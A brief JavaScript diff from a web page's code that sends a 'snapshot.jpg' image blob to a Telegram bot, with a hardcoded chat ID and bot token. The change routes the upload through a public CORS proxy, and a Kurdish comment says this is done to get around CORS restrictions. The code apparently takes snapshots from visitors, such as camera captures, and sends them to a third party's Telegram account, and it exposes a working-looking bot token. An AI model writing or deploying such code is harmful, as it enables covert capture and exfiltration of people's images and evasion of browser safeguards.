@@ -26,7 +26,8 @@
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              fetch('https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
+              // بەکارهێنانی پرۆکسی بۆ تێپەڕاندنی ڕێگرییەکانی CORS
+              fetch('https://corsproxy.io/?https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
                 method: 'POST',
                 body: formData
               })
